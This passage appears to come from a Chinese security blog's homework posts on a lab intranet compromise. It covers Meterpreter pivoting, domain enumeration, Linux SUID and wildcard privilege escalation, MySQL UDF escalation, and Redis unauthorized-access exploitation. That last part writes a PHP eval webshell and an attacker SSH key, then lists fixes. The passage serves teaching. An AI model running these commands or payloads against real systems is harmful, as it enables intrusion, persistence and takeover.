class="hljs-number">38</span> <span class="hljs-number">18</span> <span class="hljs-number">63</span> fb <span class="hljs-number">0</span>d <span class="hljs-number">7</span>f <span class="hljs-number">67</span> ec <span class="hljs-number">37</span> <span class="hljs-number">87</span> <span class="hljs-number">84</span> e9 cc <span class="hljs-built_in">f3</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">56</span> <span class="hljs-number">72</span> bc <span class="hljs-number">0</span>c cf e8 <span class="hljs-number">20</span> a7 <span class="hljs-number">93</span> <span class="hljs-number">07</span> <span class="hljs-number">29</span> <span class="hljs-number">3</span>d b5 <span class="hljs-number">48</span> b6 <span class="hljs-number">33</span> de e9 df <span class="hljs-number">3</span>a <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">94</span> a7 <span class="hljs-number">90</span> e6 <span class="hljs-built_in">d5</span> <span class="hljs-number">4</span>f ce a8 <span class="hljs-number">88</span> <span class="hljs-number">9</span>e a5 <span class="hljs-number">18</span> <span class="hljs-number">78</span> e4 <span class="hljs-number">43</span> e8 <span class="hljs-number">5</span>b e5 <span class="hljs-number">47</span> dc <span class="hljs-number">0</span>a <span class="hljs-number">34</span> be <span class="hljs-number">79</span> <span class="hljs-number">6</span>a fa fe <span class="hljs-number">7</span>f <span class="hljs-built_in">d5</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">38</span> <span class="hljs-number">48</span> <span class="hljs-number">79</span> <span class="hljs-number">53</span> <span class="hljs-number">7</span>b <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">9</span>e <span class="hljs-number">78</span> <span class="hljs-number">31</span> cf <span class="hljs-number">35</span> <span class="hljs-number">7</span>b <span class="hljs-number">12</span> <span class="hljs-number">93</span> e7 <span class="hljs-number">3</span>a <span class="hljs-built_in">f1</span> <span class="hljs-number">0</span>c de <span class="hljs-number">90</span> <span class="hljs-built_in">d9</span> e5 <span class="hljs-number">69</span> <span class="hljs-number">02</span> a9 ab <span class="hljs-built_in">c6</span> da <span class="hljs-built_in">f2</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>f <span class="hljs-number">8</span>a <span class="hljs-number">0</span>a ed <span class="hljs-number">19</span> <span class="hljs-number">44</span> <span class="hljs-number">11</span> <span class="hljs-built_in">c4</span> ba <span class="hljs-number">93</span> <span class="hljs-number">12</span> <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">69</span> <span class="hljs-number">3</span>a <span class="hljs-number">31</span> <span class="hljs-number">4</span>e ff b8 a7 <span class="hljs-number">72</span> da <span class="hljs-number">4</span>b <span class="hljs-number">6</span>e ad db e9 <span class="hljs-number">52</span> <span class="hljs-number">7</span>f <span class="hljs-number">88</span> cf <span class="hljs-number">0</span>f <span class="hljs-number">01</span> <span class="hljs-number">92</span> <span class="hljs-number">87</span> <span class="hljs-number">68</span> ba <span class="hljs-number">5</span>a <span class="hljs-built_in">d1</span> <span class="hljs-built_in">d3</span> ec <span class="hljs-number">1</span>f <span class="hljs-built_in">c3</span> b1 a5 <span class="hljs-number">3</span>b <span class="hljs-number">44</span> e5 <span class="hljs-number">7</span>b <span class="hljs-number">9</span>d <span class="hljs-number">2</span>f a9 <span class="hljs-number">28</span> <span class="hljs-number">5</span>b</code></pre>

<p>可以看到密码已经被破解处理</p>
<pre><code class="hljs angelscript">password：<span class="hljs-symbol">hongrisec@</span><span class="hljs-number">2019</span></code></pre>



<h3 id="远程桌面登录"><a href="#远程桌面登录" class="headerlink" title="远程桌面登录"></a>远程桌面登录</h3><p>已经获得了administrator的账号和密码，现在我们既可以使用administrator账号登录，也可以新建账号登录。</p>
<p>直接使用administrator登录的话可能被管理员发现，所以使用第二种方法</p>
<pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> hack <span class="hljs-keyword">password</span>  /<span class="hljs-keyword">add</span>
net localgroup administrators hack /<span class="hljs-keyword">add</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511183802017.png" alt="image-20210511183802017" style="zoom: 50%;">

<p>查看主机是否开启<code>3389</code>端口</p>
<pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">3389</span> -v <span class="hljs-number">192.168.74.129</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184005186.png" alt="image-20210511184005186" style="zoom:50%;">

<p>可以发现是关闭的。</p>
<p>使用meterpreter,打开该端口(运行之前好像需要重新弹出shell,直接运行没有成功)</p>
<pre><code class="hljs awk">run post<span class="hljs-regexp">/windows/m</span>anage/enable_rdp</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184531850.png" alt="image-20210511184531850" style="zoom:67%;">

<p>再次扫描就会发现3389端口已经打开</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184630200.png" alt="image-20210511184630200" style="zoom:67%;">

<p>直接连接即可</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511185014529.png" alt="image-20210511185014529" style="zoom:50%;">

<h3 id="添加路由、挂Socks4a代理"><a href="#添加路由、挂Socks4a代理" class="headerlink" title="添加路由、挂Socks4a代理"></a>添加路由、挂Socks4a代理</h3><ul>
<li><p>添加路由的目的是为了让我们的MSF其他模块能访问内网的其他主机</p>
</li>
<li><p>添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务</p>
</li>
</ul>
<p>注：添加路由一定要在挂代理之前，因为代理需要用到路由功能</p>
<p>在获取<code>shell</code>的机器上添加路由</p>
<pre><code class="hljs routeros">meterpreter &gt; <span class="hljs-built_in">run</span> get_local_subnets
meterpreter &gt; <span class="hljs-built_in">run</span> autoroute -s 192.168.21.0/24
<span class="hljs-comment"># 添加路由</span>
meterpreter &gt; <span class="hljs-built_in">run</span> autoroute -p
<span class="hljs-comment"># 显示路由</span>
meterpreter &gt;<span class="hljs-built_in"> route </span>flush 
<span class="hljs-comment"># 删除</span></code></pre>

<p>使用<code>run post/windows/gather/arp_scanner RHOSTS=192.168.21.0/24</code>，查看存活的主机</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511193307727.png" alt="image-20210511193307727" style="zoom: 50%;">

<p>然后建立<code>socks4</code>代理</p>
<pre><code class="hljs bash">meterpreter &gt; background
msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4a
msf5 auxiliary(server/socks4a) &gt; <span class="hljs-built_in">set</span> srvhost 127.0.0.1
msf5 auxiliary(server/socks4a) &gt; <span class="hljs-built_in">set</span> srvport 1080
msf5 auxiliary(server/socks4a) &gt; run</code></pre>



<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511195019515.png" alt="image-20210511195019515" style="zoom:50%;">

<p>设置完代理后攻击者主机就可以访问内网了</p>
<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><pre><code class="hljs bash">net time /domain        <span class="hljs-comment">#查看时间服务器</span>
net user /domain        <span class="hljs-comment">#查看域用户</span>
net view /domain        <span class="hljs-comment">#查看有几个域</span>
net group <span class="hljs-string">&quot;domain computers&quot;</span> /domain         <span class="hljs-comment">#查看域内所有的主机名</span>
net group <span class="hljs-string">&quot;domain admins&quot;</span>   /domain          <span class="hljs-comment">#查看域管理员</span>
net group <span class="hljs-string">&quot;domain controllers&quot;</span> /domain       <span class="hljs-comment">#查看域控</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200502702.png" alt="image-20210511200502702" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200553874.png" alt="image-20210511200553874" style="zoom:50%;"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200623757.png" alt="image-20210511200623757" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200650884.png" alt="image-20210511200650884" style="zoom:50%;"></p>
<p>汇总</p>
<p>从域信息收集可以得到以下信息：</p>
<ul>
<li><p>域：god.org</p>
</li>
<li><p>域内有三个用户：administrator、ligang、liukaifeng01</p>
</li>
<li><p>域内有三台主机：DEV1(不在此环境中)、ROOT-TVI862UBEH、STU1</p>
</li>
<li><p>域控：OWA(192.168.52.138)</p>
</li>
<li><p>域管理员：administrator</p>
</li>
</ul>
<p>由此可见，我们现在获得的即是域管理员权限。此环境内还有一台ROOT-TVI862UBEH(192.168.52.141)和域控OWA(192.168.52.138)。</p>
<h3 id="内网主机信息收集"><a href="#内网主机信息收集" class="headerlink" title="内网主机信息收集"></a>内网主机信息收集</h3><p>远程登录桌面后会看到一个Nmap应用，可以用这个探测内网主机</p>
<p>当然之前已经设置完代理了，也可以使用kali中的msf探测</p>
<h3 id="内网存活主机探测"><a href="#内网存活主机探测" class="headerlink" title="内网存活主机探测"></a>内网存活主机探测</h3><p>因为之前的代理搭建存在问题，导致这一步不能做，就在网上找了一些相关操作</p>
<p>在域环境渗透中可以省略，因为使用域命令可以直接查询域中有哪些主机。在非域环境中渗透，可以使用这一步。在这里顺带提一下这个用法。更多的关于使用MSF进行内网探测，传送门：<a href="https://blog.csdn.net/qq_36119192/article/details/92556219">后渗透阶段之基于MSF的内网主机探测</a></p>
<pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_sweep    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>
auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_probe    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>
auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname         <span class="hljs-comment">#基于netbios协议发现内网存活主机</span></code></pre>

<h3 id="内网存活主机端口扫描"><a href="#内网存活主机端口扫描" class="headerlink" title="内网存活主机端口扫描"></a>内网存活主机端口扫描</h3><p><strong>使用MSF自带模块进行端口探测</strong></p>
<pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp           <span class="hljs-comment">#基于tcp进行端口扫描(默认扫描1-10000)</span></code></pre>

<p><strong>也可以用nmap扫描</strong></p>
<h3 id="内网存活主机服务探测"><a href="#内网存活主机服务探测" class="headerlink" title="内网存活主机服务探测"></a>内网存活主机服务探测</h3><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>ftp/ftp_version            <span class="hljs-comment">#发现内网ftp服务，基于默认21端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>ssh/ssh_version            <span class="hljs-comment">#发现内网ssh服务，基于默认22端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>telnet/telnet_version      <span class="hljs-comment">#发现内网telnet服务，基于默认23端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>dns/dns_amp                <span class="hljs-comment">#发现dns服务，基于默认53端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>http/http_version          <span class="hljs-comment">#发现内网http服务，基于默认80端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>http/title                 <span class="hljs-comment">#探测内网http服务的标题</span>
auxiliary<span class="hljs-regexp">/scanner/</span>smb/smb_version            <span class="hljs-comment">#发现内网smb服务，基于默认的445端口   </span>
auxiliary<span class="hljs-regexp">/scanner/m</span>ssql/mssql_schemadump     <span class="hljs-comment">#发现内网SQLServer服务,基于默认的1433端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>oracle/oracle_hashdump     <span class="hljs-comment">#发现内网oracle服务,基于默认的1521端口 </span>
auxiliary<span class="hljs-regexp">/scanner/my</span>sql/mysql_version        <span class="hljs-comment">#发现内网mysql服务，基于默认3306端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>rdp/rdp_scanner            <span class="hljs-comment">#发现内网RDP服务，基于默认3389端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>redis/redis_server         <span class="hljs-comment">#发现内网Redis服务，基于默认6379端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>db2/db2_version            <span class="hljs-comment">#探测内网的db2服务，基于默认的50000端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname             <span class="hljs-comment">#探测内网主机的netbios名字</span></code></pre>





<h1 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h1><h2 id="通配符提权"><a href="#通配符提权" class="headerlink" title="通配符提权"></a>通配符提权</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>通配符是一个字符或一组字符，可以用来替换某些范围&#x2F;类别的字符。在执行任何其他操作之前，通配符首先要经过shell进行解释。</p>
<p>下面是一些常见的通配符：</p>
<p>*   星号可以与文件名中的任意数量的字符匹配，包括0个字符。</p>
<p> ?   问号用于匹配任意单个字符。</p>
<p>[ ]  括号内包括一组字符，其中任何一个字符都可以匹配该位置上的单个字符。</p>
<p> –   []中的连字符表示字符范围。</p>
<p>~   单词开头的波浪符表示当前用户的主目录的名称。如果该字符后面是另一个用户的登录名，则表示该用户的主目录。</p>
<p><strong>利用chown的<code>--reference</code>参数提权</strong></p>
<p>–reference&#x3D;&lt;参考文件或目录&gt;：把指定文件或目录的所有者与所属组，统统设置成和参考文件或目录的所有者与所属组相同。</p>
<h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><p>实验环境<code>ubuntu18.04</code></p>
<p>首先创建一个hacker用户</p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">adduser hacker</span></code></pre>

<p>登录sunzy账号，在<code>home/sunzy/test</code> 随便写一些文件，作为实验参考对象</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210417165902255.png" alt="image-20210417165902255"></p>
<p>登录hacker账号，并且在test目录下写两个文件</p>
<p>这里需要实验su命令提升权限，并且将所有者和用户组改为hacker</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210417170157713.png" alt="image-20210417170157713"></p>
<p>其中hacker.php与’–reference&#x3D;hacker.php’中的名字需要一致</p>
<p>使用root权限在<code>/home/sunzy/test/</code>执行</p>
<pre><code class="hljs nginx"><span class="hljs-attribute">chown</span> -R hacker1:hacker1 <span class="hljs-regexp">*.php</span></code></pre>

<p>结果如下，发现，属于<code>sunzy</code>用户的文件，现在属于hacker，这样hacker就可以对这些文件进行读写操作。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210417165619087.png" alt="image-20210417165619087" style="zoom:50%;">





<h2 id="linux-SUID提权"><a href="#linux-SUID提权" class="headerlink" title="linux SUID提权"></a>linux SUID提权</h2><h3 id="关于SUID"><a href="#关于SUID" class="headerlink" title="关于SUID"></a>关于SUID</h3><p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。</p>
<h3 id="查找具有-SUID-权限位文件"><a href="#查找具有-SUID-权限位文件" class="headerlink" title="查找具有 SUID 权限位文件"></a>查找具有 SUID 权限位文件</h3><p>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从&#x2F;目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到&#x2F;dev&#x2F;null，从而仅列出该用户具有访问权限的那些二进制文件。</p>
<pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span>
<span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span>
<span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</code></pre>

<p>也可以使用 <code>sudo -l</code> 命令列出当前用户可执行的命令</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233650739.png" alt="image-20210425233650739" style="zoom:50%;">

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><strong>nmap</strong></p>
<p>nmap（2.02-5.21）存在交换模式，可利用提权</p>
<pre><code class="hljs ada">nmap <span class="hljs-comment">--interactive</span></code></pre>

<p>之后执行:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">nmap</span>&gt; !sh
<span class="hljs-attribute">sh</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span># whoami
<span class="hljs-attribute">root</span></code></pre>

<p>msf中的模块为：</p>
<pre><code class="hljs awk">exploit<span class="hljs-regexp">/unix/</span>local/setuid_nmap</code></pre>

<p>较新版可使用 <code>--script</code> 参数：</p>
<pre><code class="hljs arcade">echo <span class="hljs-string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; <span class="hljs-regexp">/tmp/</span>shell.nse &amp;&amp; sudo nmap --script=<span class="hljs-regexp">/tmp/</span>shell.nse</code></pre>

<p>kali nmap 7.7 提权成功：</p>
<p><img src="https://jlkl.github.io/2020/01/27/Web_15/20200127154030.png"></p>
<h2 id="mysql-UDF提权"><a href="#mysql-UDF提权" class="headerlink" title="mysql UDF提权"></a>mysql UDF提权</h2><h3 id="UDF提权原理"><a href="#UDF提权原理" class="headerlink" title="UDF提权原理"></a>UDF提权原理</h3><p>UDF指的是用户自定义函数，用户可以对数据库所使用的函数进行一个扩展（利用dll文件），从而定制一些符合自己需求的函数，但是同样的，当黑客获取了数据库的root用户的一个权限时，即使所在的系统权限很低，也可以使用UDF来自定义一个执行系统命令的函数，但是执行权限为管理员权限，从而可以用来添加管理员账户，远程连接。</p>
<p>这里使用mysql进行复现。</p>
<p>首先我们需要拥有mysql数据库的root权限，由于mysql的版本不同，udf提权的方式也不同。</p>
<p>mysql版本&gt;5.1 需要在mysql的安装目录下创建 lib\plugin 这个文件夹（默认不存在），之后将把dll文件放在这个文件夹中；<br>mysql版本&lt;5.1 需要将dll文件放在 C:\windows\或C:\windows\system32。</p>
<p>然后加载函数，就可以使用了。</p>
<p>注意：提权所用的dll在sqlmap或msf中都有，要与受害机的系统与数据库位数进行匹配。</p>
<p><img src="https://img-blog.csdnimg.cn/20200806175635321.png" alt="在这里插入图片描述"></p>
<h3 id="msf提权演示"><a href="#msf提权演示" class="headerlink" title="msf提权演示"></a>msf提权演示</h3><p>这里主要演示大于5.1的版本。<br>所以接下来创建目录，关于创建目录，下面的第二篇参考提供了一个使用NTFS ADS流的方式，大家可以进行尝试，这里我直接手工进行创建。</p>
<p>然后我们需要把自定义好的函数，也就是执行系统命令的函数加载进数据库中，我们需要先将定义好的一个dll放入lib\plugin这个文件夹，这里如果无法上传文件，我们可以创建一个数据表，将dll中的数据十六进制编码，之后在通过读取的方式写入到lib\plugin\udf.dll文件中，这样也是可以达到上传文件的效果的。<br>写入文件有一个前提，就是secure_file_priv这个选项需要为空值，这样才可以加载或写入文件。</p>
<p><img src="https://img-blog.csdnimg.cn/20200806173131434.png" alt="在这里插入图片描述"></p>
<p>NULL表示不可以写入<br>修改mysql.ini文件，使其为空值</p>
<p><img src="https://img-blog.csdnimg.cn/20200806173252232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pbmdfeHQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>这样一来就可以写入文件了。</p>
<p>但是这里我们利用msf进行攻击，需要远程连接该主机的数据库，所以要提前查看，该数据库是否可以远程连接。</p>
<p><img src="https://img-blog.csdnimg.cn/20200806173304225.png" alt="在这里插入图片描述"></p>
<p>这里发现root用户的连接对象都是本地，可以使用sql语句进行修改，将其改为允许远程连接</p>
<pre><code class="hljs n1ql"><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> host = <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;</code></pre>


<p>这条语句来修改连接对象为所有主机<br>之后尝试使用msf进行攻击。</p>
<p>进入msf，加载exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload模块</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233528810.png" alt="image-20210425233528810" style="zoom:67%;">

<p>这里的需要mysql数据库的账号和密码，以及连接的主机。<br>设置完之后，尝试攻击。<br>攻击完之后，在受害机的lib\plugin目录下将会生成一个dll文件。<br>之后查看已载入的函数并尝试执行。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233540791.png" alt="image-20210425233540791" style="zoom:50%;">

<p>执行成功返回0。<br>由于该命令没有回显，不方便，所以我们需要手动的加载一个有回显的函数。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233551282.png" alt="image-20210425233551282" style="zoom:67%;">

<p>这里的dll文件的名称是msf随机的，利用该条命令载入了sys_eval函数</p>
<p><img src="https://img-blog.csdnimg.cn/20200806174919488.png" alt="在这里插入图片描述"></p>
<p>可以看到该条函数成功将执行结果回显出来了。</p>
<h1 id="redis未授权访问漏洞利用"><a href="#redis未授权访问漏洞利用" class="headerlink" title="redis未授权访问漏洞利用"></a>redis未授权访问漏洞利用</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Redis因配置不当就会导致未授权访问。在默认情况下，Redis会绑定在 0.0.0.0:6379。如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样 Redis 服务直接暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问到目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，还可以利用 Redis 自身提供的config 命令进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
<p>该漏洞的产生条件有以下两点：</p>
<p>1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；<br>2.没有设置密码认证（一般为空），可以免密码(认证)远程登录redis服务。</p>
<p>漏洞危害：<br>(1) 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；<br>(2) 攻击者可通过执行lua代码，或通过数据备份功能往磁盘写入后门文件；<br>(3) 最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器;</p>
<h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在kali中安装redis 3.2.0</p>
<pre><code class="hljs awk">创建redis安装目录
mkdir <span class="hljs-regexp">/usr/</span>local/redis
cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>
wget http:<span class="hljs-regexp">//</span>download.redis.io<span class="hljs-regexp">/releases/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz
<span class="hljs-regexp">//</span>获取redis压缩包
tar xzf redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz
cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>
make <span class="hljs-comment">#编译安装</span></code></pre>

<p>安装完成之后需要修改配置文件，配置允许可以远程访问。</p>
<p>vim redis.conf #修改默认配置文件</p>
<p>在bind 127.0.0.1前面加上#号进行注释，并将protected-mode设置为no。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153138387.png" alt="image-20210414153138387" style="zoom:67%;">



<p>然后进入src目录，将redis-server和redis-cli拷贝到&#x2F;usr&#x2F;bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了），并将redis.conf拷贝到&#x2F;etc&#x2F;目录下。</p>
<pre><code class="hljs bash"><span class="hljs-built_in">cd</span> src
<span class="hljs-built_in">cp</span> redis-cli /usr/bin
<span class="hljs-built_in">cp</span> redis-server /usr/bin
<span class="hljs-built_in">cp</span> redis.conf /etc/</code></pre>

<p>开启redis服务</p>
<pre><code class="hljs awk">redis-server <span class="hljs-regexp">/etc/</span>redis.conf</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153309311.png" alt="image-20210414153309311" style="zoom:50%;">

<p>第一台作为攻击机即可，然后将这台主机克隆作为目标主机</p>
<p>攻击机</p>
<p>ip:192.168.164.145</p>
<p>目标主机</p>
<p>ip:192.168.164.23</p>
<p>首先确定目标主机是否开启redis服务，使用nmap扫描端口6379</p>
<p>如下，显示了目标使用的redis版本以及服务器的信息</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413225839841.png" alt="image-20210413225839841" style="zoom:67%;">



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="1-写入木马文件"><a href="#1-写入木马文件" class="headerlink" title="1.写入木马文件"></a>1.写入木马文件</h3><p>首先进入redis安装目录的src中执行</p>
<pre><code class="hljs avrasm">./redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-number">192.168</span><span class="hljs-number">.164</span><span class="hljs-number">.23</span></code></pre>

<p>成功控制目标的redis服务</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230028713.png" alt="image-20210413230028713"></p>
<p>向其网站根目录中写入一句话木马</p>
<pre><code class="hljs php-template"><span class="language-xml">config set dir /var/www/html</span>
<span class="language-xml"></span>
<span class="language-xml">config set dbfilename shell.php</span>
<span class="language-xml"></span>
<span class="language-xml">set x &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span>
<span class="language-xml"></span>
<span class="language-xml">save </span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230359912.png" alt="image-20210413230359912"></p>
<p>save成功后，目标主机的网站根目录就出现了木马文件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230408356.png" alt="image-20210413230408356"></p>
<p>使用蚁剑连接</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230614612.png" alt="image-20210413230614612" style="zoom:50%;">





<h3 id="2-写ssh-keygen公钥然后使用私钥进行登陆"><a href="#2-写ssh-keygen公钥然后使用私钥进行登陆" class="headerlink" title="2.写ssh-keygen公钥然后使用私钥进行登陆"></a>2.写ssh-keygen公钥然后使用私钥进行登陆</h3><p>写入ssh公钥后可以在本机存储对应的ssh密钥，然后直接无密码登陆。</p>
<p>首先生成公钥密钥文件</p>
<pre><code class="hljs awk">ssh-keygen -t rsa

cat <span class="hljs-regexp">/root/</span>.ssh/id_rsa.pub</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131910830.png" alt="image-20210414131910830" style="zoom:50%;">

<p>继续使用命令</p>
<pre><code class="hljs swift">config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span>root<span class="hljs-operator">/</span>.ssh<span class="hljs-operator">/</span>

config <span class="hljs-keyword">set</span> authorized_keys

<span class="hljs-keyword">set</span> x <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>\id_rsa.pub的内容<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>

save</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131805309.png" alt="image-20210414131805309" style="zoom: 67%;">



<p>使用公钥连接</p>
<pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> id_rsa root<span class="hljs-keyword">@192</span>.168.164.23</code></pre>

<p>这里的id_rsa与创建ssh密钥输入的内容一致</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414133547275.png" alt="image-20210414133547275"></p>
<h3 id="3-利用计划任务反弹shell"><a href="#3-利用计划任务反弹shell" class="headerlink" title="3.利用计划任务反弹shell"></a>3.利用计划任务反弹shell</h3><p>只能在centos环境中利用因为centos环境中的计划任务文件可以忽略乱码，ubuntu环境因为无法忽略文件中的乱码因此无法使用</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1、限制登录ip<br>在redis.conf文件中设置redis访问的ip白名单，如果项目允许的话最好设置为只允许本地访问。</p>
<p>2、添加密码<br>在redis.conf配置文件中找到requirepass并去掉前面的#， 然后在后面设置一个高强度的密码。因为redis验证密码的速度很快，给攻击者进行高速的爆破密码提供了一个良好的基础，所以设置一个高强度的密码不仅解决了未授权的问题还能防止密码爆破。</p>
<p>3、修改默认端口</p>
]]></content>
      <categories>
        <category>homework</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>xss</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>sso</title>
    <url>/2023/09/10/sso/</url>
    <content><![CDATA[<h1 id="SSO"><a href="#SSO" class="headerlink" title="SSO"></a>SSO</h1><p>SSO（Single Sign-On）单点登录。它是一种身份验证和授权机制，允许用户使用一组凭据（如用户名和密码）登录到一个应用程序，然后在不再需要重新输入凭据的情况下，访问其他已经集成了SSO的应用程序。</p>
